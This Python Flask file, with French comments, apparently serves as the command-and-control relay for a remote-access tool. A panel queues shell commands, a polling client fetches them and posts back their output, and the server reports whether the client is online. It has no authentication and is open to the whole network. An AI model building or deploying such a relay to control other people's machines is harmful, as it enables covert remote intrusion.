from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # 🔥 Autorise les requêtes du panel

current_command = ""  # Stocke la dernière commande reçue
last_result = ""  # Stocke le dernier résultat envoyé par le client

@app.route("/command", methods=["GET"])
def get_command():
    global current_command
    return jsonify({"command": current_command})

@app.route("/command", methods=["POST"])
def set_command():
    global current_command
    data = request.json
    current_command = data.get("command", "")
    return jsonify({"status": "Commande reçue", "command": current_command})

@app.route("/result", methods=["POST"])
def receive_result():
    global last_result
    last_result = request.form.get("output", "")
    return jsonify({"status": "Résultat reçu"})

@app.route("/status", methods=["POST"])
def client_status():
    return jsonify({"status": "Client en ligne"})

@app.route("/get_result", methods=["GET"])
def get_result():
    global last_result
    return jsonify({"output": last_result})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)  # 🔥 Accessible via le réseau
